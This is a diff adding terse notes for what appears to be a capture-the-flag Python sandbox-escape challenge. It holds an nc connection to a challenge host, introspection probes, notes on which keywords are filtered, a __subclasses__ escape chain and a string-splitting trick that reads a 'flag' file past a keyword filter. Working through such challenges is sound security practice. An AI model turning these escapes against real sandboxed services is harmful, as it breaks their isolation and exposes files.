@@ -1,0 +1,25 @@
+nc 168.188.123.213 37387
+
+
+globals()
+
+dir(go)
+
+go.func_globals
+dir(go.func_code)
+
+go.func_code.co_consts
+
+__import__('subprocess').
+
++ 필터
+import 필터
+i를 필터
+
+inspect필터
+from inspect import stack;from inspect import getmembers;getmembers(stack())
+
+
+().__class__.__bases__[0].__subclasses__()
+
+"o""pen('flag','r').rea""d()"
